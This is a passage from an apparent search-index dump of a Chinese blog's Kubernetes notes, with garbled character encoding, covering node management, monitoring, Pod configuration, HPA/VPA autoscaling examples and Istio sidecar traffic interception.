ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"èŠ‚ç‚¹ç®¡ç† ","date":"2021-10-10","objectID":"/kubernetes/:13:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"OS èŠ‚ç‚¹å¯ä»¥é€‰æ‹©å®‰è£…ç±»ä¼¼ CentOSã€Ubuntuã€Debian ç­‰é€šç”¨æ“ä½œç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸ºå®¹å™¨ä¼˜åŒ–çš„æœ€å°åŒ–æ“ä½œç³»ç»Ÿï¼Œå¦‚ CoreOSã€RedHat Atomic ç­‰ã€‚åè€…çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºä½“ç§¯æ›´å°ã€å®‰å…¨æ€§æ›´é«˜ã€ä»¥åŠåŸå­çš„å‡çº§å’Œå›é€€æ“ä½œã€‚ä¾‹å¦‚ï¼ŒAtomic å°±æ˜¯åŸºäº rpm-ostree çµæ´»åœ°æ„å»ºã€å‡çº§ã€å›é€€æ“ä½œç³»ç»Ÿé•œåƒçš„ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:13:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"èµ„æºç®¡ç† kubelet åŸºäº cAdvisorï¼Œå‘¨æœŸæ€§å‘ API Server ä¸ŠæŠ¥èŠ‚ç‚¹çŠ¶æ€ï¼Œä½œä¸ºè°ƒåº¦å™¨åœ¨è°ƒåº¦èŠ‚ç‚¹æ—¶çš„å‚è€ƒã€‚Kubernetes é‡‡ç”¨ Lease æœºåˆ¶ï¼Œåœ¨ nodeLeaseDurationSeconds æ—¶é—´å†…ï¼Œå¦‚æœèŠ‚ç‚¹çš„ Lease å¯¹è±¡æ²¡æœ‰æ›´æ–°ï¼Œå°±è®¤ä¸ºèŠ‚ç‚¹ä¸å¥åº·ã€‚ åŒæ—¶ï¼Œkubelet ä¹Ÿå¯ä»¥ä¸ºèŠ‚ç‚¹ OS ä¸­å…¶ä»–ç³»ç»Ÿè¿›ç¨‹é¢„ç•™èµ„æºï¼Œé€šè¿‡ k describe node å¯ä»¥æŸ¥çœ‹èŠ‚ç‚¹çš„æ€»èµ„æºé‡ capacity å’Œå¯åˆ†é…é¢ allocatableã€‚ç£ç›˜åŒæ ·è¢«åˆ†ä¸ºç³»ç»Ÿåˆ†åŒº nodefs å’Œå®¹å™¨è¿åŠ¿åˆ†åŒº imagefsã€‚ åœ¨èŠ‚ç‚¹èµ„æºä¸å¤Ÿæ—¶ï¼Œkubelet ä¼šç»ˆæ­¢éƒ¨åˆ† Pod ä¸­çš„å®¹å™¨è¿›ç¨‹ä»¥å›æ”¶èµ„æºï¼Œä¿è¯èŠ‚ç‚¹ç¨³å®šæ€§ï¼Œä½†ä¸ä¼šåˆ é™¤ Podï¼Œè¿™ä¸€è¿‡ç¨‹ç§°ä¸ºé©±é€ã€‚ç”±äºè¢«é©±é€çš„ Pod å·²ç»åœæ­¢å´ä¸ä¼šè¢«åˆ é™¤ï¼Œéœ€è¦æ³¨æ„å®šæœŸæ¸…ç†è¿™äº› Podã€‚æ ¹æ®è¿›ç¨‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼Œç”šè‡³å¯èƒ½å‘ç”Ÿ OOM Killã€‚ å­˜å‚¨æ–¹é¢ï¼Œéœ€è¦æ³¨æ„æ—¥å¿—çš„å®šæ—¶ rotateï¼Œé˜²æ­¢å¤§é‡æ—¥å¿—å ç”¨ç£ç›˜ã€‚ç½‘ç»œæ–¹é¢ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ kubernetes.io/ingress-bandwidth å’Œ kubernetes.io/egress-bandwidth æ¥æ§åˆ¶å‡ºå…¥æµé‡ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:13:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å¼‚å¸¸æ£€æµ‹ node-problem-detector æ˜¯ Kubernetes ä¸­æ£€æµ‹èŠ‚ç‚¹å¼‚å¸¸ä¿¡æ¯å¹¶ä¸ŠæŠ¥çš„å·¥å…·ï¼Œé€šè¿‡è®¾ç½® NodeCondition æ”¹å˜èŠ‚ç‚¹çŠ¶æ€æ¥å¤„ç†æ°¸ä¹…æ€§æ•…éšœã€é€šè¿‡ Event å¯¹è±¡æ¥é€šçŸ¥å…¶ä»–å¯¹è±¡ä¸´æ—¶æ€§æ•…éšœã€‚ ä¸è¿‡ NodeCondition çš„å˜åŒ–ä¸ä¼šå½±å“è°ƒåº¦å™¨é€»è¾‘ï¼Œè€Œæ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±ç¼–å†™æ§åˆ¶å™¨ï¼Œç›‘å¬ NodeCondition å˜åŒ–å¹¶åšæ±¡ç‚¹æ ‡è®°ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:13:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"è¿ç»´ç›¸å…³ ","date":"2021-10-10","objectID":"/kubernetes/:14:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"é•œåƒç®¡ç† æˆ‘ä»¬è¿˜å¯ä»¥è‡ªè¡Œæ„å»ºç§æœ‰é•œåƒä»“åº“ï¼Œå¢å¼ºå®‰å…¨æ€§å’Œå¯è¾¾æ€§ï¼Œåªè¦éµå¾ª OCI çš„ Distribution Spec å°±å¯ä»¥åƒä½¿ç”¨å…¬æœ‰é•œåƒä»“åº“ä¸€æ ·ä½¿ç”¨è‡ªå·±çš„é•œåƒä»“åº“ã€‚ä¾‹å¦‚ï¼ŒHarbor å°±å¯ä»¥ç”¨æ¥æ„å»ºä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œçš„é•œåƒä»“åº“ï¼Œè¿˜æä¾›äº†è‡ªåŠ¨åŒ–çš„æ—¥å¿—æ”¶é›†ã€åƒåœ¾å›æ”¶ç­‰åŠŸèƒ½ã€‚å½“ç„¶ï¼Œé•œåƒä»“åº“åŒæ ·éœ€è¦é«˜å¯ç”¨éƒ¨ç½²ã€‚ç§æœ‰é•œåƒä»“åº“é…åˆ Dragonfly ï¼Œå¯ä»¥å¤§å¤§åŠ é€Ÿé•œåƒçš„æ‹‰å–ã€‚ é•œåƒæœ¬èº«ä¹Ÿå¯èƒ½å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œåœ¨æ„å»ºé•œåƒæ—¶åº”æ³¨æ„å‡å°‘ä¸å¿…è¦ä¾èµ–ã€é¿å…ç›´æ¥åœ¨æ„å»ºæŒ‡ä»¤ä¸­å¼•ç”¨æ•æ„Ÿä¿¡æ¯ç­‰ã€‚éƒ¨ç½²ä¸º Pod å‰ï¼Œåº”é€šè¿‡å‡†å…¥æ§åˆ¶å¯¹é•œåƒè¿›è¡Œå®‰å…¨æ¼æ´æ‰«æã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:14:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CI/CD åœ¨ Kubernetes ä¸­å½“ç„¶ä¹Ÿè¦æŠŠ CI/CD è‡ªåŠ¨åŒ–ã€å®¹å™¨åŒ–ã€‚è¿™æ–¹é¢ç°æœ‰çš„æˆç†Ÿå·¥å…·éƒ½å¯ä»¥æ¯”è¾ƒæ–¹ä¾¿åœ°ä½¿ç”¨ï¼š Jenkins GitOps GitHub Actions é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰åŸºäºå£°æ˜å¼ API çš„ Tektonã€ArgoCD ç­‰ç­‰ï¼Œè¿™äº›å·¥å…·éƒ½ä¸æœ¬èº«é‡‡ç”¨å£°æ˜å¼ API çš„ Kubernetes é«˜åº¦å…¼å®¹ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:14:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"ç›‘æ§å’Œæ—¥å¿— åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ—¥å¿—æŸ¥çœ‹è¾ƒä¸ºå¤æ‚ï¼Œå› æ­¤éœ€è¦å·¥å…·å°†æ—¥å¿—æ”¶é›†æ±‡æ€»ï¼Œä¾¿äºæŸ¥çœ‹ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ Loki-stack å­ç³»ç»Ÿï¼Œé€šè¿‡è¿è¡Œåœ¨èŠ‚ç‚¹ä¸Šçš„ Promtail å°†å®¹å™¨æ—¥å¿—å‘é€åˆ° Lokiï¼Œç”± Loki èšåˆæ—¥å¿—å¹¶å‘é€åˆ° Grafanaï¼Œæœ€ç»ˆå‘ˆç°å¯è§†åŒ–æ—¥å¿—è§‚æµ‹çš„æ•ˆæœã€‚ ç›‘æ§æ–¹é¢åˆ™é€šå¸¸ä½¿ç”¨ Prometheus ä»èŠ‚ç‚¹ä¸Šæ‹‰å–ç›‘æ§æŒ‡æ ‡ï¼ˆå¾€å¾€éœ€è¦åœ¨åº”ç”¨ä»£ç ä¸­æš´éœ²ç›¸åº”çš„æŒ‡æ ‡ï¼‰ï¼Œå¹¶ç”± Grafana å±•ç¤ºã€‚ä¸ºäº†æ›´é«˜æ•ˆåœ°æŸ¥çœ‹ç›‘æ§æ•°æ®ï¼Œéœ€è¦äº†è§£ PromQL æŸ¥è¯¢è¯­è¨€ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒPrometheus è¿˜æ”¯æŒå‘Šè­¦ã€æ–­è¨€ç­‰æ“ä½œã€‚å¯ä»¥æƒ³è±¡ï¼ŒPrometheus å¯¹å†…å­˜å’Œå­˜å‚¨çš„è¦æ±‚è¾ƒé«˜ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:14:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"åº”ç”¨è¿ç§» ","date":"2021-10-10","objectID":"/kubernetes/:15:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"åº”ç”¨å®¹å™¨åŒ– å°†åº”ç”¨å®¹å™¨åŒ–ï¼Œéœ€è¦ä»ä¸¤æ–¹é¢è€ƒè™‘ï¼Œä¸€æ˜¯åº”ç”¨æœ¬èº«çš„å¯åŠ¨é€Ÿåº¦ã€å‚æ•°ã€å¥åº·æ£€æŸ¥ï¼Œè€Œæ˜¯ Dockerfile çš„ç¼–å†™ï¼Œä¾‹å¦‚ä½¿ç”¨å°½å¯èƒ½å°çš„åŸºç¡€é•œåƒã€å®‰è£…å°½å¯èƒ½å°‘çš„ä¾èµ–ã€è¿›ç¨‹æ•°æ§åˆ¶ã€ä»£ç å’Œé…ç½®åˆ†ç¦»ã€é•œåƒåˆ†å±‚ç­‰ç­‰ã€‚ å°¤å…¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®¹å™¨å’Œå®¿ä¸»æœºå…±ç”¨å†…æ ¸ï¼Œå› æ­¤ç³»ç»Ÿå‚æ•°é…ç½®ã€fd æ•°ã€è¿›ç¨‹æ•°ã€ä¸»æœºç£ç›˜éƒ½æ˜¯å…±äº«çš„ã€‚è¿™æ„å‘³ç€ä½¿ç”¨ top / cat /proc/cpuinfo / cat /proc/meminfo / df -k ç­‰å‘½ä»¤çœ‹åˆ°çš„èµ„æºéƒ½æ˜¯ä¸»æœºèµ„æºã€‚é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­åº”ç”¨å½“å‰è¿è¡Œåœ¨ Kubernetes ä¸Šè¿˜æ˜¯ä¸»æœºä¸Šå‘¢ï¼Ÿä¸€ç§åŠæ³•æ˜¯æŸ¥çœ‹ /proc/1/cgroup ä¸­æ˜¯å¦åŒ…å« kubepods å…³é”®å­—ã€‚ è‡³äº CPU å’Œå†…å­˜çš„é…é¢åŠç”¨é‡ï¼Œå¯ä»¥å‚è€ƒä¸Šæ–‡ cgroups éƒ¨åˆ†çš„å†…å®¹ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:15:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Pod é…ç½® åœ¨åº”ç”¨å®¹å™¨åŒ–ä¹‹åï¼Œéœ€è¦é…ç½® Pod specï¼Œæ¯”å¦‚å€¼å¾—æ³¨æ„çš„æœ‰ç”¨äºåˆå§‹åŒ–çš„ init containerã€æƒé™ç›¸å…³çš„ SecurityContextã€å…±äº«å“ªäº› Namespaceã€å¦‚ä½•ä¼˜é›…ç»ˆæ­¢ã€å¥åº·æ£€æŸ¥ã€DNS ç­–ç•¥ã€é•œåƒæ‹‰å–ç­–ç•¥ç­‰ç­‰ã€‚ ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯å¦‚ä¸‹çš„ä¸€ä¸ª readiness probeï¼š readinessProbe:exec:command:- /opt/rprobe.shfailureThreshold:3initialDelaySeconds:30periodSeconds:10successThreshold:1timeoutSeconds:1 ç”±äº command æ˜¯ä¸€ä¸ª bash è„šæœ¬ï¼ŒEntrypoint è¿›ç¨‹ä¼š fork() å‡ºæ–°è¿›ç¨‹æ¥æ‰§è¡Œè„šæœ¬è¿›è¡Œå¥åº·æ£€æŸ¥ã€‚ç„¶è€Œï¼Œè¿™é‡Œçš„è¶…æ—¶æ—¶é—´åªæœ‰ä¸€ç§’ï¼Œå¦‚æœæ£€æŸ¥æ²¡æœ‰æ­£å¸¸æ‰§è¡Œå®Œæˆè€Œæ˜¯è¶…æ—¶é€€å‡ºï¼Œå¹¶ä¸” Entrypoint æ²¡æœ‰æ¸…ç†å­è¿›ç¨‹çš„èƒ½åŠ›çš„è¯ï¼Œå°±ä¼šå¯¼è‡´æ¯æ¬¡å¥åº·æ£€æŸ¥éƒ½ä¼šç•™ä¸‹ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œé€ æˆ PID æ³„æ¼ã€‚ Tini é¡¹ç›®å¾ˆå¥½åœ°è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼š ENTRYPOINT [\"/tini\", \"--\"]# Run your program under TiniCMD [\"/your/program\", \"-and\", \"-its\", \"arguments\"] æ­¤æ—¶ï¼ŒPID ä¸º 1 çš„ Entrypoint è¿›ç¨‹ä¸º Tiniï¼Œåç»­å®¹å™¨ä¸­çš„åƒµå°¸è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ä¼šè¢«è®¾ä¸º 1ï¼Œæœ€åè¢« Tini æ¸…ç†ã€‚å½“ç„¶ï¼Œé™¤äº†ä½¿ç”¨ Tini å¤–ï¼Œè®¾ç½®åˆç†çš„è¶…æ—¶æ—¶é—´ä¹Ÿæ˜¯éœ€è¦çš„ã€‚ ä¸ºäº†ä¿éšœåº”ç”¨é«˜å¯ç”¨ï¼Œè¿˜å¯ä»¥è®¾ç½® PodDisruptionBudget æŒ‡å®š minAvailable æˆ– maxUnavailable æ•°é‡ï¼Œè¿™å’Œæ»šåŠ¨æ›´æ–°çš„é…ç½®æœ‰äº›ç±»ä¼¼ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:15:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Helm Kubernetes ä¸­æ‹¥æœ‰å„ç§å„æ ·çš„ API Resourcesï¼Œä¸€ä¸ªå®Œæ•´çš„æœåŠ¡å¯èƒ½å°±éœ€è¦ç”¨åˆ°å…¶ä¸­çš„å¥½å‡ ç§ï¼Œåœ¨æœåŠ¡æ•°é‡è¾ƒå¤šæ—¶è¾ƒéš¾ç®¡ç†ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨ç±»ä¼¼åŒ…ç®¡ç†å™¨çš„ Helm æ¥å®æ–½å¯¹æœåŠ¡å±‚é¢è€Œä¸æ˜¯ API Resources å±‚é¢çš„ç®¡ç†ã€‚ Helm chart å°±åƒ apt ä¸­çš„ packageï¼Œæ˜¯ Helm éƒ¨ç½²åº”ç”¨çš„å•å…ƒã€‚Helm å®¢æˆ·ç«¯å°† Helm chart å®‰è£…åˆ° Kubernetes å¹¶ç”Ÿæˆ releaseã€‚ Helm æ‹¥æœ‰ç›¸å½“æ¸…æ™°è¯¦ç»†çš„æ–‡æ¡£ï¼Œæ„Ÿè§‰è‡ªå·±å†™å¾—ä¸å¦‚æ–‡æ¡£å¥½ï¼Œå…·ä½“çš„ä½¿ç”¨è¿™é‡Œå°±ä¸å†™äº†ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:15:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CRD åº”ç”¨è¿ç§»è¿‡ç¨‹ä¸­ï¼Œéš¾å…é‡åˆ°éœ€è¦æ‰©å±• Kubernetes å¯¹è±¡ä»¥æ»¡è¶³ä¸šåŠ¡éœ€æ±‚çš„åœºæ™¯ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç¼–å†™ CRD æ¥è¾¾åˆ°è¿™ä¸€ç›®æ ‡ã€‚ä¸€èˆ¬å¯ä»¥é‡‡ç”¨ kubebuilder æ­å»ºè„šæ‰‹æ¶ï¼Œå…ˆåˆ©ç”¨ RBAC æœºåˆ¶ä¿éšœå®‰å…¨æ€§å’Œè®¾ç«‹è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œéšåå°†æ‰©å±•çš„èµ„æºæ•°æ®å­˜å‚¨åˆ° etcdï¼Œç„¶åæœ€å…³é”®çš„æ˜¯è¦å®ç° Controllerï¼Œå€ŸåŠ© APIServer ç›‘å¬å…¶ä»–å¯¹è±¡æˆ–èµ„æºçš„çŠ¶æ€å˜åŒ–å¹¶ä½œå‡ºååº”ã€‚ç¼–å†™ CRD å°±ç±»ä¼¼äºç¼–å†™ Kubernetes æ’ä»¶ï¼Œååˆ†çµæ´»ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:15:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"è‡ªåŠ¨æ‰©ç¼©å®¹ metrics-server Kubernetes ä½¿ç”¨ metrics-server ç›‘æ§é›†ç¾¤ï¼Œä» kubelet ä¸­æ”¶é›†æ•°æ®å¹¶é€šè¿‡ kube-aggregator è¿›è¡Œèšåˆï¼Œå¹¶åœ¨ APIServer ä¸­é€šè¿‡ /api/metrics.k8s.io æš´éœ²æŒ‡æ ‡æ•°æ®ã€‚å®‰è£…äº† metrics-server åï¼Œå°±å¯ä»¥é€šè¿‡ k top æ¥æŸ¥çœ‹èµ„æºä¿¡æ¯äº†ã€‚ HPA è‡ªåŠ¨æ¨ªå‘æ‰©ç¼©å®¹ HPA ä¹Ÿä¾èµ–äº metrics-server æä¾›çš„æ•°æ®ï¼Œä¾‹å¦‚æ ¹æ®èµ„æºä½¿ç”¨é‡åŠ¨æ€è°ƒæ•´ Deployment ä¸­çš„ replicas å­—æ®µç­‰ç­‰ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºå·²æœ‰çš„ Deployment php-apache åˆ›å»ºå¦‚ä¸‹ HPAï¼š apiVersion:autoscaling/v1kind:HorizontalPodAutoscalermetadata:name:php-apachenamespace:defaultspec:maxReplicas:10minReplicas:1scaleTargetRef:apiVersion:apps/v1kind:Deploymentname:php-apachetargetCPUUtilizationPercentage:50 è¡¨ç¤ºæœ€å°‘ 1 ä¸ªå‰¯æœ¬ï¼Œæœ€å¤š 10 ä¸ªå‰¯æœ¬ï¼Œå½“ CPU åˆ©ç”¨ç‡è¶…è¿‡ 50% æ—¶æ‰©å®¹ã€‚åœ¨ autoscaling/v2beta2 ä¸­ï¼Œåˆ™ä½¿ç”¨ metrics å­—æ®µç»†åŒ–æŒ‡æ ‡ç±»å‹ï¼š apiVersion:autoscaling/v2beta2kind:HorizontalPodAutoscalermetadata:name:php-apachespec:scaleTargetRef:apiVersion:apps/v1kind:Deploymentname:php-apacheminReplicas:1maxReplicas:10metrics:- type:Resourceresource:name:cputarget:type:UtilizationaverageUtilization:50 éšåï¼Œå¯¹æœåŠ¡åŠ å‹ï¼š $ k run -i --tty load-generator --rm --image=busybox --restart=Never -- /bin/sh -c \"while sleep 0.01; do wget -q -O- http://php-apache; done\" æ­¤æ—¶ HPA ä¼šåœ¨ Pod CPU åˆ©ç”¨ç‡è¾¾åˆ° 50% æ—¶æ‰©å®¹ï¼Œç›´åˆ°åˆ›å»ºäº†10 ä¸ªå‰¯æœ¬ã€‚åœæ­¢åŠ å‹ä¸€æ®µæ—¶é—´åï¼Œå‰¯æœ¬æ•°ä¼šæ…¢æ…¢ä¸‹é™ï¼Œç›´è‡³åªå‰©ä¸€ä¸ªã€‚ HPA çš„åŠ¨æ€è°ƒæ•´æ˜¯æœ‰æ•ˆçš„ï¼Œä½†æ˜¯å´å­˜åœ¨æ»åæ€§ï¼Œé¢å¯¹çªå‘æµé‡æ—¶ä»è´Ÿè½½è¶…å‡ºé˜ˆå€¼åˆ° HPA å®Œæˆæ‰©å®¹éœ€è¦è¾ƒé•¿çš„æ—¶é—´ï¼Œè¿™æ˜¯ HPA çš„ä¸»è¦ç¼ºç‚¹ã€‚ VPA å‚ç›´è‡ªåŠ¨æ‰©ç¼©å®¹åˆ™æ ¹æ®æ¯ä¸ª Pod çš„èµ„æºåˆ©ç”¨æƒ…å†µï¼ˆåŒæ ·æ¥è‡ª metrics-serverï¼‰ï¼Œè°ƒæ•´ requests å­—æ®µï¼Œä»è€Œå…è®¸ Pod è¢«è°ƒåº¦åˆ°åˆé€‚çš„èŠ‚ç‚¹ä¸Šã€‚Recommender æ”¶é›†æŒ‡æ ‡åç»™å‡ºèµ„æºè¯·æ±‚é™åˆ¶çš„å»ºè®®ï¼Œç”± Admission Plugin å°† Pod å˜å½¢ï¼ŒUpdater ç›‘å¬å»ºè®®ï¼Œæœ€ç»ˆåˆ é™¤æ—§ Podï¼Œç”± Deployment åˆ›å»ºæ–° Podã€‚ é—æ†¾çš„æ˜¯ï¼ŒVPA æˆç†Ÿåº¦ä¸è¶³ï¼Œå°šä¸èƒ½ç”¨äºç”Ÿäº§ç¯å¢ƒï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºï¼š VPA ä¼šå¯¼è‡´ Pod çš„é‡å»ºå’Œé‡å¯ï¼Œè€Œä¸” Pod å¯èƒ½è¢«è°ƒåº¦åˆ°å…¶ä»–èŠ‚ç‚¹ä¸Š VPA æ— æ³•é©±é€ä¸åœ¨å‰¯æœ¬æ§åˆ¶å™¨ä¸‹çš„ Pod VPA æ— æ³•å’Œ HPA åŒæ—¶ä½¿ç”¨ VPA ä¿®æ”¹ requests åï¼Œç»“æœå¯èƒ½è¶…å‡ºå®é™…çš„èŠ‚ç‚¹èµ„æºä¸Šé™å¯¼è‡´ Pod æ— æ³•è¢«è°ƒåº¦ ","date":"2021-10-10","objectID":"/kubernetes/:15:5","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Istio åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œé™¤äº†ä¸šåŠ¡æœ¬èº«çš„å¾®æœåŠ¡ï¼Œä¹Ÿå°±æ˜¯æ•°æ®é¢ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è´Ÿè½½å‡è¡¡ã€è®¤è¯æˆæƒã€æœåŠ¡å‘ç°ã€ç†”æ–­é™æµã€TLS åŠ å¯†ã€æ—¥å¿—ç›‘æ§ç­‰æ§åˆ¶é¢åŠŸèƒ½ï¼Œä»¥åŠç›¸åº”çš„æœåŠ¡æ³¨å†Œä¸­å¿ƒã€è®¤è¯æœåŠ¡å™¨ã€API ç½‘å…³ç­‰æ§åˆ¶é¢ç»„ä»¶ã€‚ç„¶è€Œåœ¨ä¼ ç»Ÿå¾®æœåŠ¡æ¶æ„ä¸­ï¼Œæ§åˆ¶é¢å’Œæ•°æ®é¢æ··åˆåœ¨ä¸€èµ·ï¼Œä¸ä¾¿äºç»´æŠ¤ã€‚ æœåŠ¡ç½‘æ ¼åˆ™é€šè¿‡åœ¨æ¯ä¸ªä¸šåŠ¡å¾®æœåŠ¡æ—åŠ å…¥ Sidecar åŠ«æŒå‡ºå…¥æµé‡ï¼Œæ§åˆ¶é¢çš„åŠŸèƒ½ç”± Sidecar æ¥å¤„ç†ï¼Œå› æ­¤è´Ÿè´£ä¸æ§åˆ¶é¢ç»„ä»¶æˆ–æ˜¯å…¶ä»–å¾®æœåŠ¡é€šä¿¡çš„ä¹Ÿæ˜¯ Sidecarã€‚è¿™ä½¿å¾—ä¸šåŠ¡å¾®æœåŠ¡æ— éœ€å†å…³å¿ƒæ§åˆ¶é¢é€»è¾‘ï¼Œä¹Ÿèƒ½å¤Ÿè‡ªç”±é€‰æ‹©æŠ€æœ¯æ ˆã€‚ ç„¶è€Œï¼ŒSidecar æœ¬èº«æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œæ›´å¤šçš„è¿è¡Œå®ä¾‹æ„å‘³ç€æ›´å¤æ‚çš„æ¶æ„ã€‚ç”±äºæ¯ä¸ªæœåŠ¡è°ƒç”¨éƒ½å¿…é¡»ç»è¿‡ Sidecarï¼Œå¿…å®šä¼šå¼•å…¥é¢å¤–çš„ç½‘ç»œè·³è½¬ï¼Œå¸¦æ¥ä¸€å®šæ€§èƒ½å¼€é”€ï¼Œå› æ­¤éœ€è¦æ…é‡è€ƒè™‘æ˜¯å¦çœŸçš„éœ€è¦æœåŠ¡ç½‘æ ¼ã€‚ Istio çš„æ§åˆ¶å¹³é¢ istiod å¦‚ä»Šæ˜¯ä¸€ä¸ªå•ä½“åº”ç”¨ï¼Œæ•°æ®å¹³é¢ Envoy åˆ™æ‹…ä»»äº† Sidecar çš„è§’è‰²ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:16:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Envoy ç›¸æ¯” Nginx å’Œ HA Proxyï¼ŒEnvoy æ”¯æŒ HTTP/2 å’Œä¸ä¸¢å¤±è¿æ¥çš„çƒ­é‡å¯ï¼Œå¹¶ä¸”ä¾ç„¶èƒ½ä¿æŒé«˜æ€§èƒ½ã€‚è€Œé«˜åº¦å¯æ‰©å±•æ€§ï¼ˆFilter æ’ä»¶ï¼‰å’Œ API å¯é…ç½®æ€§ä½¿å¾—å®ƒèƒ½å¤Ÿæ¯”è¾ƒè½»æ¾åœ°ä¸å¤æ‚æ§åˆ¶é¢ç»“åˆï¼Œæˆä¸ºäº†æ›´ä¸ºé€šç”¨çš„æ•°æ®é¢ã€‚ Envoy åŸºäº epollï¼Œé‡‡ç”¨å•è¿›ç¨‹å¤šçº¿ç¨‹æ¨¡å¼ï¼Œåœ¨ v1 ç‰ˆæœ¬ä¸­ä»…ä½¿ç”¨ REST+JSON è½®è¯¢çš„æ–¹å¼ï¼Œåˆ°äº† v2 åˆ™å¢åŠ äº† proto3+gRPC çš„æ”¯æŒï¼Œè¿™ä½¿å¾— Envoy èƒ½å¤ŸçœŸæ­£åº”ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:16:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æµé‡åŠ«æŒæœºåˆ¶ å½“æˆ‘ä»¬ç»™ Namespaceã€Deployment ç­‰å¯¹è±¡æ‰“ä¸Š istio-injection=enabled æ ‡ç­¾æ—¶ï¼Œå¯¹åº” Pod çš„æµé‡å°±ä¼šè¢« Sidecar åŠ«æŒï¼ŒåŸæœ¬åªè¿è¡Œä¸€ä¸ªå®¹å™¨çš„ Pod ä¼šå¤šå‡ºä¸€ä¸ª Sidecarï¼Œè¿è¡Œ istio/proxyv2 é•œåƒï¼ˆå®é™…ä¸Šå°±æ˜¯ envoyï¼‰ï¼Œè¿™æ˜¯ç”± Istio çš„ mutating webhook æ’å…¥çš„ã€‚åŒæ—¶ï¼Œé€šè¿‡ init container ä¿®æ”¹äº†åŸå®¹å™¨çš„ iptablesï¼Œä½¿å¾—å‡ºæ–¹å‘çš„ TCP æµé‡ï¼š è¢«é‡å®šå‘åˆ°è™šæ‹Ÿç›‘å¬å™¨ç›‘å¬çš„ 15001 ç«¯å£ ç”± 15001 ç«¯å£è½¬åˆ° 80 ç«¯å£ é€šè¿‡è·¯ç”±è§„åˆ™æ‰¾åˆ°ç›®æ ‡ FQDN å’Œ Endpoint è½¬å‘åˆ°ç›®æ ‡ Endpoint ç„¶è€Œï¼Œåœ¨è½¬å‘åˆ°ç›®æ ‡ Endpoint 